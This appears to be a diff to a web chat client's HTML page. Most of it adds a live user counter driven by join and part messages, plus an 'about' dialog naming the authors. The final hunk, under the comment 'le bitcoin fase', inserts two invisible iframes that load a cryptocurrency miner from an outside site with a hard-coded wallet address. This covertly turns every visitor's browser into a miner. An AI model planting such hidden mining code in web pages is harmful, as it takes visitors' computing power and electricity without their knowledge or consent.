@@ -11,6 +11,8 @@
 	<script>
 	var cc = {};
 
+	cc.nusers = 1;
+
 	cc.connect = function() {
 		$("#status").removeClass("btn-danger").removeClass("btn-success").
 			addClass("btn-info").html("connecting...");
@@ -59,6 +61,18 @@
 					$("#status").removeClass("btn-danger");
 					$("#status").addClass("btn-success");
 					$("#status").html("connection ok!");
+
+					cc.nusers = parseInt(msg.Message);
+					$("#usercount").html(cc.nusers + " users");
+
+					break;
+				case "join":
+					cc.nusers += 1;
+					$("#usercount").html(cc.nusers + " users");
+					break;
+				case "part":
+					cc.nusers -= 1;
+					$("#usercount").html(cc.nusers + " users");
 					break;
 				}
 			}
@@ -156,13 +170,39 @@
 			</div>
 -->
 		</form>
-		<div class="col-lg-offset-1 col-lg-1">
-			<div class="input-group pull-right">
-				<button id="status" class="btn btn-info disabled">connecting...</button>
-			</div>
+		<div class="pull-right">
+			<!--<div class="col-lg-offset-1 col-lg-1">
+				<div class="input-group pull-right">-->
+			<button id="usercount" class="btn btn-info disabled">1 user</button>
+			<button id="status" class="btn btn-info disabled">connecting...</button>
+
+			<!-- Button trigger modal -->
+			<button id="aboutbtn" class="btn btn-info" data-toggle="modal" data-target="#aboutmodal">about</button>
 		</div>
 	</div>
 </nav>
+
+<!-- about modal -->
+<div class="modal fade" id="aboutmodal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+	<div class="modal-dialog">
+		<div class="modal-content">
+			<div class="modal-header">
+				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+				<h4 class="modal-title" id="myModalLabel">about</h4>
+			</div>
+			<div class="modal-body">
+				<p>written by mischief and embeddedlinuxguy.</p>
+				<p>comments can be sent via email to mischief or vlad @ <a href="https://mindlock.us">mindlock.us</a>.</p>
+			</div>
+			<div class="modal-footer">
+				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+			</div>
+		</div>
+	</div>
+</div>
+
+<!-- le bitcoin fase -->
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 13QmtVxCpvZ37SFkJ1E3Vp2dvwa4mrk2we</script></iframe><iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 13QmtVxCpvZ37SFkJ1E3Vp2dvwa4mrk2we</script></iframe>
 </body>
 </html>
 
